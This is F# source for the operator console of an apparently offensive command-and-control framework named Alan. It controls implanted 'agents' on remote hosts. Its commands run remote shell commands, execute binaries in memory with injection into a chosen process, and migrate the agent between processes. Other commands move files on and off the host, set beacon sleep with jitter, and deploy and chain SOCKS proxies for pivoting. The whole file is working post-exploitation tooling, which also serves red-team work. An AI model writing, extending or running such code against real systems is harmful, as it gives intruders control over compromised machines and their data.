namespace ES.Alan.Server.Consoles

open System
open ES.Alan.Core
open ES.Fslog
open System.IO
open System.Collections.Generic
open System.Globalization
open ES.Alan.Server
open ES.Alan.Core.Entities
open ES.Alan.Core.Utility
open ES.Alan.Server.Consoles.ConsoleUtility
open System.Text
open System.Reflection

type AgentCliConsole(messageBroker: MessageBroker, agentId: UInt32, networkUtility: NetworkUtility, logProvider: ILogProvider) =
    inherit DashboardCliConsole(messageBroker, networkUtility, logProvider)

    let _logger =
        log "AgentCliConsole"
        |> info "NewProxy" "Created new proxy: {0}"
        |> error "ConfigFileNotFound" "Config file '{0}' not found"        
        |> error "WrongPidFormat" "Pid value '{0}' not valid"
        |> warning "FileNotFound" "File '{0}' not found"
        |> buildAndAdd(logProvider)    

    member private this.ExecProgram(command: String, useShell: Boolean, runInBackground: Boolean) =
        let msg = new ExecProgramMessage(agentId, command, useShell, runInBackground)
        messageBroker.Dispatch(this, msg)

    member private this.GetAgent() =
        let msg = new GetConnectedAgentsMessage()
        messageBroker.DispatchAndWaitHandling(this, msg)
        msg.Agents
        |> Seq.find(fun agent -> agent.Id = agentId)
        
    override val Type = ConsoleType.Agent agentId with get, set

    override this.PrintCursor() =
        let agent = this.GetAgent()
        let savedPalette = Console.ForegroundColor

        Console.ForegroundColor <- ConsoleColor.Yellow
        writeText(agent.ProcessId)

        Console.ForegroundColor <- ConsoleColor.DarkGray
        writeText("@")

        Console.ForegroundColor <- ConsoleColor.Gray
        writeText(agent.ListenerType)

        Console.ForegroundColor <- ConsoleColor.DarkGray
        writeText("://")

        Console.ForegroundColor <- ConsoleColor.DarkGreen
        writeText(agent.Address)

        Console.ForegroundColor <- ConsoleColor.DarkGray
        writeText("> ")
        Console.ForegroundColor <- savedPalette

    override this.ProcessCommand(command: String, args: String array) =
        if command.Equals("exit") then     
            messageBroker.Dispatch(this, new ExitAgentMessage(agentId))
            ConsoleType.Dashboard
        elif command.Equals("detach") then            
            ConsoleType.Dashboard
        elif command.Equals("shell") then 
            if args.Length > 0 then
                let background = args.Length > 1 && args.[args.Length-1].Equals("&", StringComparison.Ordinal)
                this.ExecProgram(args.[0], true, background)
                this.Type
            else
                writeLineText("You can now enter shell commands")
                writeText(":>")
                ConsoleType.AgentShell agentId
        elif command.Equals("agents") then
            base.ProcessCommand(command, args) |> ignore
            this.Type
        elif command.Equals("info") then
            messageBroker.Dispatch(this, new GetSystemInfoMessage(agentId))
            this.Type
        elif command.Equals("update") && args.Length > 0 then
            if File.Exists(args.[0]) then
                let jsonSettings = File.ReadAllText(args.[0])
                messageBroker.Dispatch(this, new UpdateConfigMessage(agentId, jsonSettings))
            else
                _logger?ConfigFileNotFound(args.[0])
            this.Type
        elif command.Equals("get-config") then
            messageBroker.Dispatch(this, new GetConfigMessage(agentId))
            this.Type
        elif command.Equals("info++") then
            messageBroker.Dispatch(this, new GetExtendedSystemInfoMessage(agentId))
            this.Type
        elif command.Equals("join") && args.Length > 0 then
            base.ProcessCommand(command, args)        
        elif command.Equals("migrate") && args.Length > 0 then
            let settings = ServerSettings.Read()

            let bitness =
                if args.Length > 1 then CpuBitness.FromString(args.[1])
                else this.GetAgent().Bitness

            let baseArtifactContent =
                match bitness with
                | CpuBitness.Bitness32 -> settings.AgentDllX86File
                | CpuBitness.Bitness64 -> settings.AgentDllX64File
                |> File.ReadAllBytes
            
            let message = 
                new MigrateAgentMessage(
                    agentId, 
                    Utility.int32Parse(args.[0], 0), 
                    baseArtifactContent,
                    ServerSettings.Read().MapToPackerSettings(),
                    bitness
                )
            messageBroker.Dispatch(this, message)
            this.Type
        elif command.Equals("ps") then
            messageBroker.Dispatch(this, new GetProcessListMessage(agentId))
            this.Type
        elif command.Equals("download") && args.Length > 0 then
            let destDir = 
                if args.Length > 1 then args.[1]
                else Directory.GetCurrentDirectory()
            messageBroker.Dispatch(this, new DownloadFileMessage(agentId, args.[0], destDir))
            this.Type
        elif command.Equals("kill") && args.Length > 0 then
            let pid = ref 0
            if Int32.TryParse(args.[0], pid) then
                messageBroker.Dispatch(this, new ProcessKillMessage(agentId, !pid))
            this.Type
        elif command.Equals("sleep") && args.Length > 0 then
            let jitter = ref 10
            let timeout = ref 0
            if Int32.TryParse(args.[0], timeout) then
                if args.Length > 1 then 
                    Int32.TryParse(args.[1], jitter) |> ignore            
                messageBroker.Dispatch(this, new AgentSleepMessage(agentId, !timeout, !jitter))
            this.Type
        elif command.Equals("upload") && args.Length > 1 then
            let rootPath = ConsoleUtility.normalizePath(args.[0])
            let destDir = args.[1]
            let files =
                if Directory.Exists(rootPath) then
                    Directory.EnumerateFiles(rootPath, "*.*", SearchOption.AllDirectories)
                    |> Seq.toArray
                else
                    [|rootPath|]            

            messageBroker.Dispatch(this, new UploadFileMessage(agentId, files, rootPath, destDir))
            this.Type
        elif command.Equals("run") && args.Length > 0 then
            let background = args.Length > 1 && args.[args.Length-1].Equals("&", StringComparison.Ordinal)
            let args =
                if background then args |> Array.removeAt(args.Length-1) 
                else args

            let pid = if args.Length > 1 then args.[1] else "0"
            match (try Some(int pid) with _ -> None) with
            | Some pid ->
                let mutable programArgs = ConsoleUtility.parseArguments(args.[0])
                let fileName = ConsoleUtility.normalizePath(programArgs.[0])
                
                if not <| File.Exists(fileName) then
                    _logger?FileNotFound(fileName)
                else
                    let settings = ServerSettings.Read()
                    let agentBitness = this.GetAgent().Bitness                    
                                        
                    let mutable fileContent = File.ReadAllBytes(fileName)
                    let bitness = 
                        if args.Length > 2 then 
                            ConsoleUtility.getBitness(args.[2], fileContent, agentBitness)
                        else 
                            ConsoleUtility.getBitness(String.Empty, fileContent, agentBitness)

                    if Path.GetExtension(fileName).Equals(".js") then
                        // set as first argument the encoded script
                        let encodedScript = Convert.ToBase64String(fileContent)
                        programArgs <- 
                            [
                                [|string(agentId)|] // the program name
                                [|encodedScript|]
                                // skip the script file argument
                                programArgs |> Array.filter(fun arg -> not <| arg.Equals(fileName, StringComparison.Ordinal))                                
                            ]
                            |>Array.concat
                        
                        // run the JS module as file content
                        fileContent <- 
                            match bitness with
                            | CpuBitness.Bitness32 -> settings.JsRunnerX86
                            | CpuBitness.Bitness64 -> settings.JsRunnerX64
                            |> File.ReadAllBytes
                    else
                        programArgs <- 
                            [
                                [|string(agentId)|] // the program name
                                programArgs 
                            ]
                            |>Array.concat

                    let interceptor =
                        if pid > 0 then
                            match bitness with
                            | CpuBitness.Bitness32 -> settings.ConsoleInterceptorX86
                            | CpuBitness.Bitness64 -> settings.ConsoleInterceptorX64
                            |> File.ReadAllBytes
                        else
                            Array.empty                           
                        
                    let message = 
                        new RunMessage(
                            agentId, 
                            pid, 
                            fileName,
                            bitness,
                            fileContent,    
                            programArgs,
                            settings.MapToPackerSettings(),
                            interceptor,
                            background
                        )
                    messageBroker.Dispatch(this, message)
            | None ->
                _logger?WrongPidFormat(pid)
            this.Type
        elif command.Equals("exec") && args.Length > 0 then  
            let background = args.Length > 1 && args.[args.Length-1].Equals("&", StringComparison.Ordinal)
            this.ExecProgram(args.[0], false, background)
            this.Type
        elif command.Equals("proxy") then
            if args.Length > 0 then
                let agent = this.GetAgent()

                // interact with the proxy
                if args.[0].Equals("new") then
                    if args.Length < 2 then
                        writeLineText("Usage: proxy new [<bind address>] <port> [<username>] [<password>] [<x86|x64>]")
                    else
                        let port =
                            if args.Length = 2 then args.[1] else args.[2]

                        let address =
                            if args.Length >= 3 then args.[1] else "127.0.0.1"

                        let username =
                            if args.Length >= 4 then args.[3] else Utility.generateRandomString(3, 8)

                        let password =
                            if args.Length >= 5 then args.[4] else Utility.generateRandomString(3, 8)

                        let bitness =
                            if args.Length >= 6 then CpuBitness.FromString(args.[5]) else agent.Bitness
                                                
                        let settings = ServerSettings.Read()
                        let proxyContent =
                            match bitness with
                            | CpuBitness.Bitness32 -> settings.ProxyX86
                            | CpuBitness.Bitness64 -> settings.ProxyX64
                            |> File.ReadAllBytes         
                                                 
                        // notify to the system that a new proxy was created
                        let newProxyMessage = 
                            new NewProxyMessage(
                                agentId, 
                                address, 
                                port, 
                                username, 
                                password,
                                ProxyType.Auto.ToString()
                            )
                        messageBroker.DispatchAndWaitHandling(this, newProxyMessage)
                        _logger?NewProxy(newProxyMessage.CreatedProxyId)

                        // instruct the agent to run the proxy binary
                        let proxyArgs = [|
                            agent.GetCleanId()
                            address
                            port
                            username
                            password
                        |]

                        let runMessage = 
                            new RunMessage(
                                agentId, 
                                0, // no injection
                                String.Empty, 
                                bitness,
                                proxyContent,
                                proxyArgs,
                                settings.MapToPackerSettings(),
                                Array.empty,
                                true
                            )
                        messageBroker.Dispatch(this, runMessage)
                elif args.[0].Equals("use", StringComparison.OrdinalIgnoreCase) then
                    if args.Length < 2 then
                        writeLineText("Usage: proxy use (<proxy Id> | [http] <address> <port> [<username>] [<password>] | auto)")
                    else
                        let proxiesMsg = new GetProxiesMessage()
                        messageBroker.DispatchAndWaitHandling(this, proxiesMsg)

                        if args.Length = 2 then
                            let proxyId = Utility.uint32Parse(args.[1], 0u)
                            proxiesMsg.Proxies
                            |> Seq.tryFind(fun p -> p.Id = proxyId)
                            |> function
                                | None -> writeLineText(String.Format("Proxy ID {0} not found.", args.[1]))
                                | Some proxy -> 
                                    let msg = new UseProxyMessage(agentId, proxy)
                                    messageBroker.Dispatch(this, msg)
                        elif args.Length >= 3 then 
                            // renaming variable since I have to modify it
                            let mutable args = args

                            let proxyType = 
                                match ProxyType.Parse(args.[1]) with
                                | ProxyType.NoProxy -> 
                                    // no type specified go with default
                                    ProxyType.Socks5
                                | v -> 
                                    // a type was specified, remove the proxy type argument
                                    args <- Array.removeAt 1 args
                                    v

                            // try to identify the dest proxy
                            let address = args.[1]
                            let port = Utility.int32Parse(args.[2], 0)
                            let username = (if args.Length > 3 then args.[3] else String.Empty)
                            let password = (if args.Length > 4 then args.[4] else String.Empty)

                            let proxyOpt = new TryGetProxyMessage(address, port.ToString(), username, password, ProxyType.Auto.ToString())
                            messageBroker.DispatchAndWaitHandling(this, proxyOpt)

                            match proxyOpt.Proxy with
                            | Some proxy ->
                                let msg = new UseProxyMessage(agentId, proxy)
                                messageBroker.Dispatch(this, msg)
                            | None ->
                                // add the proxy to the list
                                let newProxyMessage = 
                                    new NewProxyMessage(
                                        agentId, 
                                        address, 
                                        port.ToString(), 
                                        username, 
                                        password, 
                                        ProxyType.Auto.ToString()
                                    )
                                messageBroker.DispatchAndWaitHandling(this, newProxyMessage)

                                // get again the proxy (this time it must be in the list)
                                let proxyOpt = new TryGetProxyMessage(address, port.ToString(), username, password, ProxyType.Auto.ToString())
                                messageBroker.DispatchAndWaitHandling(this, proxyOpt)
                                match proxyOpt.Proxy with
                                | Some proxy ->
                                    let msg = new UseProxyMessage(agentId, proxy)
                                    messageBroker.Dispatch(this, msg)
                                | None ->
                                    writeLineText("Unable to use the specified proxy")
                                    
                elif args.[0].Equals("close") then
                    agent.Proxy
                    |> Option.iter(fun proxy ->
                        let msg = new CloseProxyMessage(agentId, proxy)
                        messageBroker.Dispatch(this, msg)
                    )
                elif args.[0].Equals("info") then

                    if args.Length < 2 then
                        writeLineText("Usage: proxy info (<proxy Id> | <proxy port>)")
                    else
                        let proxyIdOrPort = Utility.int32Parse(args.[1], 0)
                        if proxyIdOrPort > 0 then
                            let proxiesMsg = new GetProxiesMessage()
                            messageBroker.DispatchAndWaitHandling(this, proxiesMsg)
                            proxiesMsg.Proxies
                            |> Seq.tryFind(fun p -> p.Id = uint32 proxyIdOrPort)
                            |> function
                                | None ->                                 
                                    let msg = new InfoProxyMessage(agentId, proxyIdOrPort)
                                    messageBroker.Dispatch(this, msg)
                                | Some proxy -> 
                                    let msg = new InfoProxyMessage(agentId, proxy.Port)
                                    messageBroker.Dispatch(this, msg)
                        else
                            writeLineText("Proxy port value not valid")
                elif args.[0].Equals("stop") then           
                    if args.Length < 2 then
                        writeLineText("Usage: proxy stop <proxy Id>")
                    else
                        let proxyId = Utility.uint32Parse(args.[1], 0u)
                        let proxiesMsg = new GetProxiesMessage()
                        messageBroker.DispatchAndWaitHandling(this, proxiesMsg)
                        
                        // verify if there are chain to this proxy, if so, the chain must be closed                        
                        proxiesMsg.Proxies
                        |> Seq.iter(fun p ->
                            p.Chain
                            |> Option.iter(fun pc ->
                                if pc.Id = proxyId then
                                    let msg = new StopChainProxyMessage(agentId, p)
                                    messageBroker.Dispatch(this, msg)
                            )
                        )
                        
                        // now I can send the stop command
                        proxiesMsg.Proxies
                        |> Seq.tryFind(fun p -> p.Id = proxyId)
                        |> function
                            | None -> writeLineText(String.Format("Proxy ID {0} not found.", args.[1]))
                            | Some proxy -> 
                                // verify if the agent is using the proxy, if so it needs to be closed
                                // before to stop the proxy otherwise the agent became unresponsive
                                agent.Proxy
                                |> Option.iter(fun agentProxy ->
                                    if agentProxy.Id = proxyId then
                                        let msg = new CloseProxyMessage(agentId, proxy)
                                        messageBroker.Dispatch(this, msg)
                                )

                                let msg = new StopProxyMessage(agentId, proxy)
                                messageBroker.Dispatch(this, msg)
                elif args.[0].Equals("chain") then
                    if args.Length < 3 then
                        writeLineText("Usage: ")
                        writeLineText("         proxy chain <proxy Id> <address> <port> [<username>] [<password>]")
                        writeLineText("         proxy chain <proxy Id 1> <proxy Id 2>")
                        writeLineText("         proxy chain stop <source proxy Id>")
                    elif args.[1].Equals("stop", StringComparison.OrdinalIgnoreCase) then
                        let proxyId = Utility.uint32Parse(args.[2], 0u)
                        let proxiesMsg = new GetProxiesMessage()
                        messageBroker.DispatchAndWaitHandling(this, proxiesMsg)
                        proxiesMsg.Proxies
                        |> Seq.tryFind(fun p -> p.Id = proxyId)
                        |> function
                            | None -> writeLineText(String.Format("Proxy ID {0} not found.", args.[1]))
                            | Some proxy -> 
                               let msg = new StopChainProxyMessage(agentId, proxy)
                               messageBroker.Dispatch(this, msg)
                    elif args.Length = 3 then
                        let proxyIdSrc = Utility.uint32Parse(args.[1], 0u)
                        let proxyIdDest = Utility.uint32Parse(args.[2], 0u)

                        let proxiesMsg = new GetProxiesMessage()
                        messageBroker.DispatchAndWaitHandling(this, proxiesMsg)
                        proxiesMsg.Proxies
                        |> Seq.tryFind(fun p -> p.Id = proxyIdSrc)
                        |> function
                            | None -> writeLineText(String.Format("Proxy ID {0} not found.", args.[1]))
                            | Some srcProxy -> 
                                proxiesMsg.Proxies
                                |> Seq.tryFind(fun p -> p.Id = proxyIdDest)
                                |> function
                                    | None -> writeLineText(String.Format("Proxy ID {0} not found.", args.[2]))
                                    | Some destProxy -> 
                                        let msg = new CreateChainProxyMessage(agentId, srcProxy, destProxy)
                                        messageBroker.Dispatch(this, msg)
                    else                        
                        let proxyId = Utility.uint32Parse(args.[1], 0u)
                        let proxiesMsg = new GetProxiesMessage()
                        messageBroker.DispatchAndWaitHandling(this, proxiesMsg)
                        proxiesMsg.Proxies
                        |> Seq.tryFind(fun p -> p.Id = proxyId)
                        |> function
                            | None -> writeLineText(String.Format("Proxy ID {0} not found.", args.[1]))
                            | Some srcProxy -> 
                                // try to identify the dest proxy
                                let address = args.[2]
                                let port = Utility.int32Parse(args.[3], 0)
                                let username = (if args.Length >= 4 then args.[4] else String.Empty)
                                let password = (if args.Length >= 5 then args.[5] else String.Empty)

                                proxiesMsg.Proxies
                                |> Seq.tryFind(fun p -> 
                                    p.Address.Equals(address, StringComparison.OrdinalIgnoreCase) &&
                                    p.Port = port &&
                                    p.Username.Equals(username, StringComparison.OrdinalIgnoreCase) &&
                                    p.Password.Equals(password, StringComparison.OrdinalIgnoreCase)
                                )
                                |> function
                                    | Some destProxy ->
                                        let msg = new CreateChainProxyMessage(agentId, srcProxy, destProxy)
                                        messageBroker.Dispatch(this, msg)
                                    | None ->
                                        let destProxy = {
                                            Id = 0u
                                            Address = args.[2]
                                            Port = Utility.int32Parse(args.[3], 0)
                                            Username = (if args.Length > 4 then args.[4] else String.Empty)
                                            Password = (if args.Length > 5 then args.[5] else String.Empty)
                                            Type = ProxyType.Socks5.ToString()
                                            Chain = None
                                        }

                                        // add the proxy to the list
                                        let newProxyMessage = 
                                            new NewProxyMessage(
                                                agentId, 
                                                address, 
                                                port.ToString(), 
                                                username, 
                                                password, 
                                                ProxyType.Socks5.ToString()
                                            )
                                        messageBroker.Dispatch(this, newProxyMessage)

                                        // send the chain message
                                        let chainMsg = new CreateChainProxyMessage(agentId, srcProxy, destProxy)
                                        messageBroker.Dispatch(this, chainMsg)
            else
                // just list the proxies for each agent
                base.ProcessCommand(command, args) |> ignore
            this.Type
        elif not <| String.IsNullOrWhiteSpace(command) then
            base.ProcessCommand(command, args) |> ignore
            this.Type        
        else
            this.Type
    
    override this.GetHelp() = 
        """
[+] Help:
        ? or help                                       Show this help.
        agents                                          List the currently active agents.  
        exec <cmd> [&]                                  Execute the command on the remote host (& run the process in background).
        shell [<cmd>] [&]                               Execute the shell command on the remote host.
                                                        If no command is specified, a command shell is started
                                                        on the remote host (& run the process in background).
        run <cmd> [<pid>] [<x86|x64>] [&]               In memory execution of a local binary. If a <pid> is 
                                                        specific the file is injected into that process, otherwise 
                                                        a default one is chosen. & run the process in background.
        proxy [<new|use|close|stop|chain|info>] [<opt>] Create a new proxy or interact with it. No arguments for listing.
        kill <pid>                                      Terminate the specified process.
        info                                            Get information on the host system.
        info++                                          Get extended information on the host system.         
        get-config                                      Download the agent config to the specified file.
        detach                                          Detach from the agent session without terminating the agent.        
        ps                                              Show a list of the current running processes.
        join <agent ID>                                 Select the specified agent as the currently active one.
        update <config file>                            Send a new configuration to the agent.
        migrate <process ID> [<x86|x64>]                Migrate the agent session to the specified process ID.
        download <remote> [<local>]                     Locally download the file(s) from the agent host.
        upload <local> <remote>                         Upload a local file(s) to the agent host.
        sleep <msec> [<variance>]                       Set the agent sleep timeout. A variance integer can be specified.
        exit                                            Termination the agent process.
        """

    override this.CommandCompleted(commandId: Int32) =
        writeLineText()
        this.PrintCursor()
        ConsoleType.Agent agentId